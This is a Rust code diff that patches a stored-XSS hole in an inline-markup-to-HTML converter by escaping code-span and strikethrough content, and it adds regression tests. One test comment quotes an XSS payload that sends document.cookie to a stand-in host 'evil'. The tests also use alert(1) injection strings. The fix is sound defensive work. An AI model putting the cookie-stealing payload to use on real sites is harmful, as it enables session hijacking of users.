@@ -635,10 +635,12 @@ pub fn convert_inline_markup_str(text: &str, target: InlineTarget) -> String {
                         ('/', InlineTarget::Markdown) => {
                             format!("*{}*", convert_inline_markup_str(content, target))
                         }
-                        ('~' | '=', InlineTarget::Html) => format!("<code>{}</code>", content),
+                        ('~' | '=', InlineTarget::Html) => {
+                            format!("<code>{}</code>", html_escape(content))
+                        }
                         ('~' | '=', InlineTarget::Markdown) => format!("`{}`", content),
                         ('~' | '=' | '+', InlineTarget::PlainText) => content.to_string(),
-                        ('+', InlineTarget::Html) => format!("<del>{}</del>", content),
+                        ('+', InlineTarget::Html) => format!("<del>{}</del>", html_escape(content)),
                         ('+', InlineTarget::Markdown) => format!("~~{}~~", content),
                         _ => content.to_string(),
                     };
@@ -1201,6 +1203,33 @@ mod tests {
     fn inline_markup_code_html() {
         let result = convert_inline_markup_str("hello =world=", InlineTarget::Html);
         assert_eq!(result, "hello <code>world</code>");
+    }
+
+    #[test]
+    fn adversarial_code_span_content_is_html_escaped_not_injected() {
+        // Real, no-click stored-XSS: a KB node body containing
+        // ~<img src=x onerror=fetch('https://evil/?c='+document.cookie)>~
+        // used to pass `content` straight into `<code>{}</code>` with zero
+        // escaping -- the resulting fragment is later assigned via
+        // `element.innerHTML` in the exported HTML's chord-diagram viewer,
+        // so the payload executes on render, no interaction required.
+        let payload = "~<img src=x onerror=alert(1)>~";
+        let result = convert_inline_markup_str(payload, InlineTarget::Html);
+        assert!(
+            !result.contains("<img"),
+            "a live <img> tag must never survive into the rendered fragment: {result}"
+        );
+        assert_eq!(result, "<code>&lt;img src=x onerror=alert(1)&gt;</code>");
+    }
+
+    #[test]
+    fn adversarial_strikethrough_content_is_html_escaped_not_injected() {
+        // Same bug, same fix, the sibling `+strikethrough+` marker (<del>)
+        // had the identical unescaped-content pattern.
+        let payload = "+<script>alert(1)</script>+";
+        let result = convert_inline_markup_str(payload, InlineTarget::Html);
+        assert!(!result.contains("<script>"), "unescaped: {result}");
+        assert_eq!(result, "<del>&lt;script&gt;alert(1)&lt;/script&gt;</del>");
     }
 
     #[test]
